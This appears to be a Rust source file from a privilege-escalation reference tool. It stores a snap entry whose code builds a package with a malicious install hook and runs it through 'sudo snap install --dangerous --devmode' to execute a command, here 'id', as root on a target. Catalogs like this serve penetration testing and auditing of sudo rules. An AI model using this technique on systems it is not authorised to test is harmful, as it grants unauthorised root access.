pub static BIN_NAME: &'static str = "snap";
pub static SUDO_DESC: &'static str = "It runs commands using a specially crafted Snap package. Generate it with fpm and upload it to the target.";
pub static SUDO_CODE: &'static str = r#"
    
    COMMAND=id
    cd $(mktemp -d)
    mkdir -p meta/hooks
    printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
    chmod +x meta/hooks/install
    fpm -n xxxx -s dir -t snap -a all meta

    sudo snap install xxxx_1.0_all.snap --dangerous --devmode
"#; // NOTE combined two code snippets here
use crate::code::{Code, Tag};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
